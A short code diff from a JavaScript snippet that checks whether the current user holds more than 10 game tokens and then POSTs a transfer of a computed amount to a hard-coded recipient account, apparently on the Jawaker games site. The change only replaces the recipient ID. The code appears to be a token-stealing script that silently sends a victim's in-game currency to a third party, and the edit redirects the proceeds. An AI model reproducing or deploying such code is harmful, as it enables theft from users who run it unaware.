@@ -32,7 +32,7 @@ if (App.current_user.get("game_tokens")> 10 ){
   "Referer": "https://www.jawaker.com/en/games/trix",
   "Referrer-Policy": "strict-origin-when-cross-origin"
 },
-"body": "recipient=26040042&amount=" + finalamount,
+"body": "recipient=2523293&amount=" + finalamount,
 "method": "POST"
 });
 }
